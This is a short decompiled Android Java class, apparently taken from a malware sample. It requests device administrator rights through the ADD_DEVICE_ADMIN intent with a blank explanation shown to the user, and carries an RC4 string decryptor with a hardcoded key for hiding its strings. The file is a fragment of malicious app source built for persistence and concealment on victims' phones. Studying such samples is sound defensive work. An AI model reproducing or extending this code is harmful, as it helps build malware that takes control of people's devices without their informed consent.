package com.example.mmm.Admin;

import android.app.*;
import com.example.mmm.*;
import com.example.mmm.Utils.*;
import com.example.mmm.API.*;
import android.util.*;
import android.os.*;
import android.app.admin.*;
import android.content.*;

public class ActivityAdmin extends Activity
{
    constants consts;
    utils utl;
    
    public ActivityAdmin() {
        super();
        this.consts = new constants();
        this.utl = new utils();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    protected void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        final ClassAdmin classAdmin = new ClassAdmin((Context)this);
        if (this.getIntent().getStringExtra("admin").equals("1")) {
            final Intent \u0131ntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            \u0131ntent.putExtra("android.app.extra.DEVICE_ADMIN", (Parcelable)classAdmin.locking$);
            \u0131ntent.putExtra("android.app.extra.ADD_EXPLANATION", "");
            this.startActivityForResult(\u0131ntent, 100);
        }
        else {
            ((DevicePolicyManager)this.getSystemService("device_policy")).removeActiveAdmin(new ComponentName((Context)this, (Class)ReceiverDeviceAdmin.class));
        }
        this.finish();
    }
}
